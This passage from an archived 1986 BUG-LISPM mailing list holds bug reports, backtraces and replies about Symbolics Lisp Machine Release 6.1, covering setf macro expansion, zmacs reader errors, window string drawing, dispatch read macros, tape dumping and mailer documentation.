then (baz a b c v)?  Why doesn't setf just return this and be done
with it?  This would always work no matter what baz was like and would
always be efficient and would only take one line of code in setf to
implement.  What could be better than that?

<there are some more detailed responses below>

    Date: Fri, 4 Apr 86 18:51  EST
    From: Charles Hornig <Hornig at SCRC-RIVERSIDE.ARPA>

        Date: Fri, 4 Apr 86 16:05 EST
        From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>

        In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
        AISite 14.2, microcode TMC5-COL-MIC 353, FEP 127,
        FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
        FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), 
        on PA Lisp Machine Merlin:

        Evaluate the following forms in Common Lisp.
    	    (defmacro foo (x type) `(bar ,x ,type))
    	    (defun bar (x type) (case type (:car (car x)) (:cdr (cdr x))))
    	    (defmacro bar-setf (x type value)
    	      (print (list x type value))
    	      (case type
    		(:car `(rplaca ,x ,value))
    		(:cdr `(rplaca ,x ,value))
    		(otherwise `(error ,x ,value))))
    	    (defsetf bar bar-setf)

        Then evaluate
        (macroexpand-1 '(setf (foo a :car) 2))

        you get
        (#:G0001 #:G0002 #:G0003)
        (#:G0001 #:G0002 #:G0003)
        (ERROR A 2)

        It appears that setf is making the unwarranted assumption that
        you can substitute gensyms for the arguments to a macro and
        macroexpandit and then substitute in the actual values for the
        gensyms.  This is not true for example when one of the
        arguments is a keyword!

    DEFSETF only works with macros if the macros treat their arguments just
    as a function would.  My I suggest that a simple huristic would
allow setf to at least issue a good error message here.  First expand
the macro with gensyms replacing the arguments.  Second expand the
macro a second time with the original arguments.  Third, subsistute
the original arguments for the gensyms in the result of the first
macro expansion.  If what you get is not equal to what you got from
the second macro expansion, then the "rule" has been violated, and you
could at least issue an error message to that effect.

    For example, how would you expect
       (macroexpand-1 '(setf (foo a (read)) 2))
    to expand?  It certainly has no right to do the (READ) at compile time.
I would expect this to expand to
  (error a 2)
My macro does not attempt to evaluate the (read) and compile time.
Being a macro it does not attempt to evaluate its args, it just looks
at them.  This is also an erronious use of my macro since it expects
its second argument to be a keyword, not something that evaluates into
a keyword.
 8-Apr-86 11:58:05-EST,3412;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 8 Apr 86 11:57-EST
Received: from TWEETY-PIE.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 8 APR 86  11:59:14 EST
Date: Tue, 8 Apr 86 11:57 EST
From: Cory Myers <cory@MIT-BUGS-BUNNY.ARPA>
Subject: zmacs busted
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860408115749.1.CORY@MIT-TWEETY-PIE.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13,
microcode TMC5-IO4-FPA-COLOR-MIC 336, on Lisp Machine Tweety Pie:

I was in the middle of typing in some code when this happened.

>>Trap: The first argument given to the SYS:INTERNAL-= instruction, NIL, was not a number.
While in the function CHAR-EQUAL  VARIABLE-FOR-RULE-READER-MACRO  (:INTERNAL SI:READ-INTERNAL 0)

CHAR-EQUAL:  (P.C. = 3)
   Arg 0 (SI:CH1): NIL
   Arg 1 (SI:CH2): 33

VARIABLE-FOR-RULE-READER-MACRO:  (P.C. = 24)  (from KBSP: EXTENDED; RULE-MACROS)
   Arg 0 (LIST-SO-FAR): :TOPLEVEL
   Arg 1 (STREAM): SI:READ-FROM-STRING-STREAM

(:INTERNAL SI:READ-INTERNAL 0):  (P.C. = 31)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 43440350>

SI:WITH-INPUT-EDITING-INTERNAL:  (P.C. = 25)
   Arg 0 (SI:STREAM): SI:READ-FROM-STRING-STREAM
   Arg 1 (SI:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:READ-INTERNAL 0) 43440352>
   Arg 2 (SI:ACTIVATORS): (148)
   Arg 3 (SI:LINE-P): NIL
   Arg 4 (SI:INPUT-EDITOR-OPTIONS): NIL

SI:READ-INTERNAL:  (P.C. = 34)
   Arg 0 (FUNCTION): READ
   Rest arg (SI:READ-ARGS): (SI:READ-FROM-STRING-STREAM SI:NO-EOF-OPTION)

READ:  (P.C. = 6)
   Rest arg (SI:READ-ARGS): (SI:READ-FROM-STRING-STREAM SI:NO-EOF-OPTION)

READ-FROM-STRING:  (P.C. = 23)
   Arg 0 (STRING): "?INVERSE-PAIRS"
   --Defaulted args:--
   Arg 1 (SI:EOF-OPTION): SI:NO-EOF-OPTION
   Arg 2 (SI:START): 0
   Arg 3 (SI:END): NIL

ZWEI:SYMBOL-AT-PAREN:  (P.C. = 65)
   Arg 0 (ZWEI:BP): ("    (?INVERSE-PAIRS" 4)

ZWEI:INDENT-FOR-LISP:  (P.C. = 72)
   Arg 0 (ZWEI:BP): ("" 0)
   Local 0 (ZWEI:BP): ("" 0)
   Arg 1 (ZWEI:START-DEFINITION-BP): ("(DEFINE-ADD-REDUCTION-RULE ADDING-NEGATION" 0)

ZWEI:INDENT-INTERVAL-FOR-LISP:  (P.C. = 130)
   Arg 0 (ZWEI:BP1): ("" 0)
   Arg 1 (ZWEI:BP2): ("" 0)
   Arg 2 (ZWEI:IN-ORDER-P): NIL
   Arg 3 (ZWEI:START-BP): NIL
   Local 3 (ZWEI:START-BP): ("(DEFINE-ADD-REDUCTION-RULE ADDING-NEGATION" 0)
   Arg 4 (ZWEI:COMMENTS-P): NIL

ZWEI:COM-INDENT-FOR-LISP:  (P.C. = 25)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-INDENT-FOR-LISP
   Arg 1 (ZWEI:CHAR): 137
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): (ZWEI:SHIFT-LOCK-HOOK)

ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
   Arg 0 (ZWEI:CH): 137

(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120377766>
   Arg 2 (SI:OPERATION): :EDIT
   --Defaulted args:--
   Arg 3 (ZWEI:TOP-LEVEL-P): T
   Arg 4 (ZWEI:DESCRIPTION): NIL

(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:TOP-LEVEL-EDITOR -- 13. IV's, 1. FL's 120377366>
   Arg 2 (SI:.OPERATION.): :EDIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
 8-Apr-86 14:24:28-EST,1080;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 8 Apr 86 14:21-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 27896; Tue 8-Apr-86 14:25:00-EST
Date: Tue, 8 Apr 86 14:21 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: Suggested new method for basic-hardcopy-stream
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860408142149.0.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.3, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

It would be nice if there were a method for basic-hardcopy-stream that 
sets a character. That is, shows a character, then moved the cursorpos
by the width of that character. This is less than what :tyo does, but
more than what :show-char does.

(defmethod (basic-hardcopy-stream :set-char) (char)
  (send self :show-char char)
  (setq cursor-x device-cursor-x))
 8-Apr-86 15:25:27-EST,1388;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 8 Apr 86 15:25-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  8 Apr 86 15:26:22 EST
Received: from PEACE.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 458186; Tue 8-Apr-86 14:06:52-EST
Date: Tue, 8 Apr 86 13:53  EST
From: Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Subject: Can't make declarations within a using-resource
To: Chris Lindblad <CJL@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860402201449.1.CJL@OTIS.AI.MIT.EDU>
Message-ID: <860408135302.3.HORNIG@PEACE.SCRC.Symbolics.COM>

    Date: Wed, 2 Apr 86 20:14 EST
    From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
    AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
    FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
    FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

    using-resource expands such that 

    (using-resource (mumble mumblefrots)
      (declare (mumbler mumble))
      ...)

    is illegal. 

    It would be nice if I could make a declare simply inside a
    using-resource.

Thank you for this report.  The problem you describe has been fixed and
the fix will be released in a future version of the system.

 8-Apr-86 20:20:31-EST,1532;000000000000
Received: from RICKY.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 8 Apr 86 20:20-EST
Date: Tue, 8 Apr 86 20:20 EST
From: Jonathan Taft <TAFT@MIT-MC.ARPA>
Subject: bug in TV:DRAW-STRING-HORIZONTAL (also TV:DRAW-STRING-VERTICAL)
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860408202056.6.TAFT@RICKY.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.3, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Ricky Nelson:

TV:DRAW-STRING-HORIZONTAL (and ...VERTICAL) are confused about where the
edges of the window lie.  They use the INSIDE-SIZE message to obtain edges.
This screws you if you are trying to draw strings up against the right
side a window.

This code:  (from the file >sys>r6>window)

   (DEFUN-METHOD DRAW-STRING-HORIZONTAL GRAPHICS-MIXIN
		 (STRING LAST-INDEX FROM-X Y EXTRA EXTRA-PER-GAP PERIOD
			 SHORTFALL BACK-P FAT-P ALU FONT-TABLE DEFAULT-FONT)
     (MULTIPLE-VALUE-BIND (X-EDGE Y-EDGE) (SEND SELF ':INSIDE-SIZE)
       (LOOP FOR I FROM 0 TO LAST-INDEX
	.
	.
	.

Should probably read as:

   (DEFUN-METHOD DRAW-STRING-HORIZONTAL GRAPHICS-MIXIN
		 (STRING LAST-INDEX FROM-X Y EXTRA EXTRA-PER-GAP PERIOD
			 SHORTFALL BACK-P FAT-P ALU FONT-TABLE DEFAULT-FONT)
     (MULTIPLE-VALUE-BIND (ignore ignore X-EDGE Y-EDGE) (SEND SELF ':inside-edges)
       (LOOP FOR I FROM 0 TO LAST-INDEX
	.
	.
	.
 8-Apr-86 21:04:41-EST,1837;000000000000
Received: from ELVIS.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 8 Apr 86 21:04-EST
Date: Tue, 8 Apr 86 21:05 EST
From: Jonathan A Rees <JAR@MIT-MC.ARPA>
Subject: bogus subchars in common lisp dispatch read macros
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860408210505.1.JAR@ELVIS.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.3, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Elvis Presley:

The second argument to dispatch macro functions should be a character.
They get fixnums instead.

- Jonathan

(defun sharp-T/F-read-macro (stream subchar arg)
  (ignore arg stream)
  (ccase subchar ((#\t #\T) t) ((#\f #\F) nil)))

(set-dispatch-macro-character #\# #\T #'sharp-T/F-read-macro)
(set-dispatch-macro-character #\# #\F #'sharp-T/F-read-macro)

#t

>>Error: The second argument (SUBCHAR) to CLSCH:SHARP-T/F-READ-MACRO, 84, was of the wrong type.
         The function expected one of #\t, #\T, #\f, #\F.
While in the function CLSCH:SHARP-T/F-READ-MACRO  (:INTERNAL CL:SET-DISPATCH-MACRO-CHARACTER 0)  (:INTERNAL SI:READ-INTERNAL 0)

CLSCH:SHARP-T/F-READ-MACRO:  (P.C. = 21)  (from MC: JAR; CLSCH)
   Arg 0 (CL:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 1 (CLSCH:SUBCHAR): 84
   Arg 2 (CLSCH:ARG): GLOBAL:NIL

(:INTERNAL CL:SET-DISPATCH-MACRO-CHARACTER 0):  (P.C. = 7)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): (84 #<DTP-COMPILED-FUNCTION CLSCH:SHARP-T/F-READ-MACRO 32520774>)
   Arg 1 (SCL::LIST-SO-FAR): :TOPLEVEL
   Arg 2 (CL:STREAM): #:TERMINAL-IO-SYN-STREAM

(:INTERNAL SI:READ-INTERNAL 0):  (P.C. = 31)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 40301005>

...
 8-Apr-86 21:41:42-EST,5363;000000000000
Received: from PIGPEN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 8 Apr 86 21:41-EST
Date: Tue, 8 Apr 86 21:41 EST
From: Daniel Huttenlocher <dph@MIT-AI.ARPA>
Subject: carry tape tries to dump directory link
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860408214159.1.DPH@PIGPEN.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.3, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Pigpen:

The carry tape dumper tries to dump >tex>texfonts.directory which is a link to
>tex>fonts>pxl.directory.  It should check what a link links to before trying to dump it
to tape.

>>Error: It is not permitted to open directories for other than PROBE.
         For Z:>TeX>Fonts>pxl.directory.1
While in the function (:METHOD FS:NFILE-SERVER-UNIT :WAIT-FOR-COMMAND)  (:METHOD FS:NFILE-SERVER-UNIT :SEND-AND-WAIT-FOR-COMMAND)  (:METHOD FS:NFILE-SERVER-UNIT :SEND-IN-COMMAND-CONDITION-ENVIRONMENT)

(:METHOD FS:NFILE-SERVER-UNIT :WAIT-FOR-COMMAND):  (P.C. = 65)
   Arg 0 (SELF): #<NFILE-SERVER-UNIT 53621540>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:NFILE-SERVER-UNIT -- 15. IV's, 0. FL's 120223317>
   Arg 2 (SI:OPERATION): :WAIT-FOR-COMMAND
   Arg 3 (FS:TID-CONS-ARGS): ("T5096" :OPEN "Open" #<NFILE-DATA-CHANNEL I5058 17554343>)
   Local 4 (FS:DATA-CHANNEL): #<NFILE-DATA-CHANNEL I5058 17554343>
   Local 5 (FS:COMMAND-TID): "T5096"
   Local 6 (FS:COMMAND-NAME): :OPEN
   Local 7 (FS:WHOSTATE): "Open"
   Local 8 (FS:RESPONSE-ARGS): ("IOD" (:PATHNAME ">TeX>Fonts>pxl.directory.1") "It is not permitted to open directories for other than PROBE.")
   Local 9 (FS:RESPONSE-NAME): :ERROR

(:METHOD FS:NFILE-SERVER-UNIT :SEND-AND-WAIT-FOR-COMMAND):  (P.C. = 40)
   Arg 0 (SELF): #<NFILE-SERVER-UNIT 53621540>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:NFILE-SERVER-UNIT -- 15. IV's, 0. FL's 120223317>
   Arg 2 (SI:OPERATION): :SEND-AND-WAIT-FOR-COMMAND
   Arg 3 (FS:DATA): (:OPEN "Open" #<NFILE-DATA-CHANNEL I5058 17554343> "I5058" ">tex>texfonts.directory.1" :INPUT :DEFAULT)

(:METHOD FS:NFILE-SERVER-UNIT :SEND-IN-COMMAND-CONDITION-ENVIRONMENT):  (P.C. = 54)
   Arg 0 (SELF): #<NFILE-SERVER-UNIT 53621540>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:NFILE-SERVER-UNIT -- 15. IV's, 0. FL's 120223317>
   Arg 2 (SI:OPERATION): :SEND-IN-COMMAND-CONDITION-ENVIRONMENT
   Arg 3 (FS:MESSAGE): :SEND-AND-WAIT-FOR-COMMAND
   Arg 4 (FS:DATA): (:OPEN "Open" #<NFILE-DATA-CHANNEL I5058 17554343> "I5058" ">tex>texfonts.directory.1" :INPUT :DEFAULT)

(:METHOD FS:NFILE-SERVER-UNIT :COMMAND):  (P.C. = 7)
   Arg 0 (SELF): #<NFILE-SERVER-UNIT 53621540>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:NFILE-SERVER-UNIT -- 15. IV's, 0. FL's 120223317>
   Arg 2 (SI:OPERATION): :COMMAND
   Rest arg (FS:DATA): (:OPEN "Open" #<NFILE-DATA-CHANNEL I5058 17554343> "I5058" ">tex>texfonts.directory.1" :INPUT :DEFAULT)

FS:NFILE-KEYWORD-LIST-CALLER:  (P.C. = 165)
   Arg 0 (FS:INSTANCE): #<NFILE-SERVER-UNIT 53621540>
   Arg 1 (FS:CMDNAME): :OPEN
   Arg 2 (FS:WHOSTATE): "Open"
   Arg 3 (FS:DATA-CHANNEL): #<NFILE-DATA-CHANNEL I5058 17554343>
   Arg 4 (FS:CONSTANT-ARGS): ("I5058" ">tex>texfonts.directory.1" :INPUT :DEFAULT)
   Local 4 (FS:CONSTANT-ARGS): NIL
   Arg 5 (FS:KEYWORD-VALUE-PAIRS): (:BYTE-SIZE NIL :DELETED NIL :RAW NIL :SUPER-IMAGE NIL :PRESERVE-DATES NIL ...)
   Local 5 (FS:KEYWORD-VALUE-PAIRS): NIL

(:METHOD FS:NFILE-ACCESS-PATH :OPEN):  (P.C. = 375)
   Arg 0 (SELF): #<LMFS-NFILE-ACCESS-PATH Z using NFILE 53605766>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:NFILE-ACCESS-PATH -- 4. IV's, 2. FL's 146561447>
   Arg 2 (SI:OPERATION): :OPEN
   Arg 3 (FS:REAL-PATHNAME): #<LMFS-PATHNAME "Z:>tex>texfonts.directory.1">
   Arg 4 (FS:COMMAND-PATHNAME): #<LMFS-PATHNAME "Z:>tex>texfonts.directory.1">
   Rest arg: (:DIRECTION :INPUT :BYTE-SIZE NIL :CHARACTERS :DEFAULT)

(:METHOD FS:ACTIVE-PATHNAME-MIXIN :OPEN):  (P.C. = 14)
   Arg 0 (SELF): #<LMFS-PATHNAME "Z:>tex>texfonts.directory.1">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:ACTIVE-PATHNAME-MIXIN -- 1. IV's, 0. FL's 120157311>
   Arg 2 (SI:OPERATION): :OPEN
   Arg 3 (FS:PATHNAME): #<LMFS-PATHNAME "Z:>tex>texfonts.directory.1">
   Rest arg (FS:OPTIONS): (:DIRECTION :INPUT :BYTE-SIZE NIL :CHARACTERS :DEFAULT)

FS:COMMON-LISP-OPEN:  (P.C. = 450)
   Arg 0 (FS:PATHNAME): #<LMFS-PATHNAME "Z:>tex>texfonts.directory.1">
   Arg 1 (FS:KEYWORD-ARGS): (:DIRECTION :INPUT :CHARACTERS :DEFAULT :BYTE-SIZE NIL)

Rest of stack:
OPEN:  (P.C. = 257)
TAPE:DUMP-FILE-OPENER:  (P.C. = 40)
TAPE:DUMP-ONE-FILE:  (P.C. = 44)
TAPE:CARRY-DUMP:  (P.C. = 234)
SI:*EVAL:  (P.C. = 401)
(:INTERNAL SI:BREAK-INTERNAL 1):  (P.C. = 4)
(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:BREAK-INTERNAL:  (P.C. = 212)
ZWEI:COM-BREAK:  (P.C. = 65)
ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
 9-Apr-86 15:26:06-EST,635;000000000000
Received: from LIVE-OAK.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 9 Apr 86 15:25-EST
Date: Wednesday, 9 April 1986, 15:26-EST
From: Postmaster at MIT-LIVE-OAK.ARPA
Subject: Unable to deliver letter
To: bug-lispm@OZ.AI

Unable to deliver letter to the following recipient:
  mike@gold-hill.dialnet.symbolics.com: Host does not provide mail service.

----- Text of letter follows -----
Date: Wed, 9 Apr 86 15:26 EST
From: In Person The Tanglewood File Server <bug-lispm@OZ.AI.MIT.EDU>
Subject: test of mail
To: mike@gold-hill.dialnet.symbolics.com
Message-ID: <860409152601.8.FILE-SERVANT@MIT-LIVE-OAK.ARPA>

message 1
 9-Apr-86 15:46:27-EST,2109;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 9 Apr 86 15:45-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  9 Apr 86 15:45:30 EST
Received: from CUYAHOGA.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 459494; Wed 9-Apr-86 14:52:17-EST
Date: Wed, 9 Apr 86 14:52 EST
From: Robert A. Cassels <Cassels@TENEX.SCRC.Symbolics.COM>
Subject: zmacs busted
To: cory@MIT-BUGS-BUNNY.ARPA, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860408115749.1.CORY@MIT-TWEETY-PIE.ARPA>
Message-ID: <860409145206.0.CASSELS@CUYAHOGA.SCRC.Symbolics.COM>
Reply-To: Robert A. Cassels <Cassels@SCRC-STONY-BROOK.ARPA>

    Date: Tue, 8 Apr 86 11:57 EST
    From: Cory Myers <cory@MIT-BUGS-BUNNY.ARPA>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13,
    microcode TMC5-IO4-FPA-COLOR-MIC 336, on Lisp Machine Tweety Pie:

    I was in the middle of typing in some code when this happened.

    >>Trap: The first argument given to the SYS:INTERNAL-= instruction, NIL, was not a number.
    While in the function CHAR-EQUAL  VARIABLE-FOR-RULE-READER-MACRO  (:INTERNAL SI:READ-INTERNAL 0)

    CHAR-EQUAL:  (P.C. = 3)
       Arg 0 (SI:CH1): NIL
       Arg 1 (SI:CH2): 33

    VARIABLE-FOR-RULE-READER-MACRO:  (P.C. = 24)  (from KBSP: EXTENDED; RULE-MACROS)
						   
Somebody's been messing around with your readtable.

       Arg 0 (LIST-SO-FAR): :TOPLEVEL
       Arg 1 (STREAM): SI:READ-FROM-STRING-STREAM

    (:INTERNAL SI:READ-INTERNAL 0):  (P.C. = 31)
    SI:WITH-INPUT-EDITING-INTERNAL:  (P.C. = 25)
    SI:READ-INTERNAL:  (P.C. = 34)
    READ:  (P.C. = 6)
    READ-FROM-STRING:  (P.C. = 23)
    ZWEI:SYMBOL-AT-PAREN:  (P.C. = 65)
    ZWEI:INDENT-INTERVAL-FOR-LISP:  (P.C. = 130)
    ZWEI:COM-INDENT-FOR-LISP:  (P.C. = 25)
    ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
    ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
    (:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
    (:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
    ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)
    SI:PROCESS-TOP-LEVEL:  (P.C. = 54)

10-Apr-86 13:57:50-EST,1152;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 10 Apr 86 13:57-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 10 APR 86  13:05:03 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 28060; Thu 10-Apr-86 13:07:09-EST
Date: Thu, 10 Apr 86 13:03 EST
From: JCMA@MIT-AI.ARPA
Subject: Mailing List Recipients in Files
To: Bug-Lispm@MIT-REAGAN.ARPA, bug-mailer@SCRC-STONY-BROOK.ARPA,
    bug-documentation@SCRC-STONY-BROOK.ARPA
Message-ID: <860410130327.2.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.4, Experimental RELATUS 147.67, microcode TMC5-MIC 336,
FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

1) the document examiner returns no useful candidates for mailing list

2) the documentation for the mailer does not tell how to make a mailing list
definition slurp the contents of a file (e.g., COMSAT's (@FILE [JNC;CDDT
PEOPLE]) or XMAILR'S @<filename>) to use a a recipient list.

3) How does one specify this?
11-Apr-86 09:28:22-EST,1610;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 11 Apr 86 09:28-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 11 APR 86  09:26:48 EST
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-REAGAN.ARPA via INTERNET with SMTP id 28137; 11 Apr 86 09:29:50-EST
Received: from HARLEM.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 7517; Fri 11-Apr-86 09:19:26 EST
Date: Fri, 11 Apr 86 09:19  EST
From: Joseph R Goldstone <joseph@SAPSUCKER.SCRC.Symbolics.COM>
Subject: Mailing List Recipients in Files
To: JCMA@MIT-AI.ARPA, Bug-Lispm@MIT-REAGAN.ARPA,
    bug-mailer@SCRC-STONY-BROOK.ARPA,
    bug-documentation@SCRC-STONY-BROOK.ARPA
In-Reply-To: <860410130327.2.JCMA@MIT-MORRISON.ARPA>
Message-ID: <860411091919.4.JOSEPH@HARLEM.SCRC.Symbolics.COM>

    Date: Thu, 10 Apr 86 13:03 EST
    From: JCMA@MIT-AI.ARPA

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
    AISite 14.4, Experimental RELATUS 147.67, microcode TMC5-MIC 336,
    FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

    1) the document examiner returns no useful candidates for mailing list

Thanks, we'll try and fix this.

    2) the documentation for the mailer does not tell how to make a mailing list
    definition slurp the contents of a file (e.g., COMSAT's (@FILE [JNC;CDDT
    PEOPLE]) or XMAILR'S @<filename>) to use a a recipient list.

    3) How does one specify this?

It's not currently supported.

11-Apr-86 17:08:23-EST,1083;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 11 Apr 86 17:08-EST
Received: from KILLINGTON.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 31470; Fri 11-Apr-86 17:07:22-EST
Date: Fri, 11 Apr 86 17:07 EST
From: Robert Scheifler <RWS@MIT-ZERMATT.ARPA>
Subject: tv:gray-unused-areas-mixin
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860411170712.4.RWS@KILLINGTON.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.13, MLSite 13.2,
Experimental DVI 1.1, Experimental Schema 110.0, Experimental XML 2.0,
microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-DEBUG.FLOD(1),
FEP0:>V127-INFO.FLOD(2), on Killington:
